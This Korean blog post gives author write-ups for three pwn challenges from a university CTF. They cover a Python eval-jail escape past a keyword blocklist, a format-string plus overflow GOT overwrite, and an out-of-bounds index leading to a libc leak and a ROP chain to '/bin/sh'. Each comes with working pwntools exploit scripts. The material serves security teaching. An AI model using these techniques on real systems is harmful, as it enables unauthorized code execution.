---
layout: post
title: "제3회 융합보안공학과 CTF 문제 write-up"
author: "hazziin"
tags: [I.Sly()]
---

3회 CTF 문제 라업~~~

---

# Pwn
## [Pwn] Simple Calc
simple calc but you must not hack it

```py
#!/usr/bin/python3
# Can you read /flag?
 
def filter(formula):
    filter = ['import', 'os', 'subprocess', 'system', 'replace', 'flag', 'eval', 'exec', 'read', 'write']
    for k in filter:
        if k in formula:
            print("No hack ~.~")
            return False
    return True
 
def main():
    print("Simple Calculator!")
    print("Please enter your calculation formula")
 
    formula = input(">> ")
 
    if filter(formula):
        try:
            result = eval(formula)
            print("Result is: " + str(result))
        except:
            print("Error")
 
 
if __name__ == "__main__":
    main()
```
간단한 pythion jailbreak 문제다.
전에 jailbreak 문제를 접한 적이 있는데, 너무 낯설어서 못 풀었어서... ㅎㅎ 다른 대회에서 접해 보기 전에 학우들이 간단한 예제로 접해 보면 좋을 것 같아서 준비했다.

코드엔 os 등의 모듈이 없으니, builtin 함수로 os를 import하고, 필터링을 피해 `cat flag`를 실행시키면 플래그를 획득할 수 있다.
<span style="color: #888;"><em><del>(근데 지금 생각하니 왜 pwn인가 싶다... misc 아닌가? zz)</del></em></span>

```py
__builtins__.__dict__['__impor'+'t__']('o'+'s').__dict__['syste'+'m']('cat fla*')
```

## [Pwn] Everytime

<img src="{{ '/assets/isly_writeup/img10.png' | relative_url }}" width="350" class="img-left">

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  char format[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]
 
  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  print_logo();
  print_title();
  printf("Post num: ");
  __isoc99_scanf("%d%*c", &v4);
  if ( v4 == 3 )
  {
    post3();
  }
  else
  {
    if ( v4 > 3 )
    {
LABEL_9:
      puts("Invalid post");
      return 0;
    }
    if ( v4 == 1 )
    {
      post1();
    }
    else
    {
      if ( v4 != 2 )
        goto LABEL_9;
      post2();
    }
  }
  printf("Enter the comment: ");
  gets(format);
  puts("Completed");
  if ( v4 == 3 )
  {
    post3();
  }
  else if ( v4 <= 3 )
  {
    if ( v4 == 1 )
    {
      post1();
    }
    else if ( v4 == 2 )
    {
      post2();
    }
  }
  printf(&byte_4025C0);
  printf(format);
  return 0;
}
```
해당 문제에는 총 2가지 취약점이 존재한다.

1. `gets()`로 입력을 받고 있어 bof 발생
2. `printf(format)`으로 출력하고 있어 FSB 발생

직접 실행을 시켜 보면...

<img src="{{ '/assets/isly_writeup/img11.png' | relative_url }}" width="550" class="img-left">
처음엔 유저에게 글 번호를 입력받으며,

<img src="{{ '/assets/isly_writeup/img12.png' | relative_url }}" width="550" class="img-left">
번호 입력 시 해당 글을 열람하고 댓글을 남길 수 있다.

이때, 댓글에 포맷 스트링을 입력해 스택 메모리를 출력하면 아래와 같으며, 오프셋을 구할 수 있다.
<img src="{{ '/assets/isly_writeup/img13.png' | relative_url }}" width="600" class="img-left">
오프셋은 총 6이다.

checksec으로 보면 Partial RELRO이기 때문에 GOT overwrite를 할 수 있지만, 코드만 보면 마땅히 덮을 수 있는 함수가 존재하지 않는다. 그러나 canary가 걸려 있어 가장 마지막에 `__stack_chk_fail()`을 호출하게 된다. 따라서 `gets()`로 bof를 유도해 카나리를 변조하고, `__stack_chk_fail()`의 GOT를 덮어쓴다.

```py
from pwn import *
 
p = process("./everytime")
e = ELF("./everytime")
 
stack_chk_fail_got = e.got['__stack_chk_fail']
binsh = e.symbols['binsh']
 
p.sendline("1")
 
payload = ''
payload += '%{}c'.format((binsh >> 16) & 0xffff) #0x40
payload += '%11$hn'
payload += '%{}c'.format((binsh & 0xffff) - 0x40)
payload += '%12$hn'
payload += 'AA'
payload = bytes(payload, 'utf-8')
payload += p64(stack_chk_fail_got + 2)
payload += p64(stack_chk_fail_got)
payload += p64(0)
payload += b'A'*100
 
p.sendlineafter("Enter the comment: ", payload)
 
p.interactive()
```

## [Pwn] tiny arr
for “just 8bytes”…

<img src="{{ '/assets/isly_writeup/img14.png' | relative_url }}" width="650" class="img-left">

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-6Ch] BYREF
  unsigned int v5; // [rsp+8h] [rbp-68h] BYREF
  unsigned int v6; // [rsp+Ch] [rbp-64h]
  char v7[6]; // [rsp+10h] [rbp-60h] BYREF
  __int16 v8; // [rsp+16h] [rbp-5Ah]
  __int64 v9; // [rsp+18h] [rbp-58h]
  __int64 v10; // [rsp+20h] [rbp-50h]
  __int64 v11; // [rsp+28h] [rbp-48h]
  __int64 v12; // [rsp+30h] [rbp-40h]
  __int64 v13; // [rsp+38h] [rbp-38h]
  __int64 v14; // [rsp+40h] [rbp-30h]
  __int64 v15; // [rsp+48h] [rbp-28h]
  __int64 v16; // [rsp+50h] [rbp-20h]
  __int64 v17; // [rsp+58h] [rbp-18h]
  unsigned __int64 v18; // [rsp+68h] [rbp-8h]
 
  v18 = __readfsqword(0x28u);
  v8 = 0;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  sub_4011D6(a1, a2, a3);
  v6 = 10;
  strcpy(v7, "hello");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. read\n2. write");
      printf(">>> ");
      __isoc99_scanf("%d", &v4);
      if ( v4 != 1 )
        break;
      printf("Index: ");
      __isoc99_scanf("%d", &v5);
      if ( !(unsigned int)sub_40124C(v6, v5) )
        puts(&v7[8 * v5]);
    }
    if ( v4 != 2 )
      break;
    printf("Index: ");
    __isoc99_scanf("%d", &v5);
    if ( !(unsigned int)sub_40124C(v6, v5) )
      read(0, &v7[8 * v5], 8uLL);
  }
  return 0LL;
}
 
__int64 __fastcall sub_40124C(int a1, int a2)
{
  if ( a2 < a1 )
    return 0LL;
  puts("Index is out of range.");
  return 1LL;
}
```
간단한 배열 관리 프로그램으로, 배열의 특정 인덱스에 8bytes의 데이터를 입/출력할 수 있는 프로그램이다. 
그러나 인덱스 범위 검사가 미흡해 10 이상인 것은 검사에 걸리지만, 이하는 걸리지 않아 10으로 지정되어 있는 인덱스 크기를 조작할 수 있다.
따라서 -1번째 인덱스에 있는 10을 더 큰 수로 변조하면 aaw와 aar이 가능하니, libc base를 leak한 후 rop로 공격하면 된다.

<img src="{{ '/assets/isly_writeup/img15.png' | relative_url }}" width="700" class="img-left">
<img src="{{ '/assets/isly_writeup/img16.png' | relative_url }}" width="700" class="img-left">

콜스택을 확인해 보면 ret에 들어 있는 주소는 `__libc_start_call_main()+128`이며, 이는 
`__libc_start_main()`과 `0x30`만큼 차이가 난다. libc는 `__libc_start_main()`의 하위 3자리의 베이스 주소와 `puts()` 등의 주소를 통해 libc를 찾아 적당한 것으로 적용해 넣어 주면 된다.
따라서 아래와 같이 익스코드를 작성할 수 있다.

```py
from pwn import *
 
p = process("./smallarr")
libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
 
prdi = 0x0000000000401243
ret = 0x000000000040101a
system = libc.symbols["system"]
binsh = list(libc.search(b"/bin/sh"))[0]
 
def read_func(index):
    p.sendlineafter(">>> ", "1")
    p.sendlineafter("Index: ", str(index))
 
def write_func(index, data):
    p.sendlineafter(">>> ", "2")
    p.sendlineafter("Index: ", str(index))
    p.send(data)
 
write_func(-1, "\x00"*6+"\x01\x00") # size = 0x100
read_func(13) # libc base leak
 
lb = p.recvn(6)
lb = u64(lb+b"\x00\x00") + 0x30 - libc.symbols["__libc_start_main"]
binsh_addr = lb + binsh
system_addr = lb + system
 
# ROP chain: ret -> prdi -> /bin/sh -> system
write_func(13, p64(ret)) # for stack alignment
write_func(14, p64(prdi))
write_func(15, p64(binsh_addr))
write_func(16, p64(system_addr))
 
pause()
p.sendlineafter(">>> ", "3")
 
p.interactive()
```
---
<br>

<br>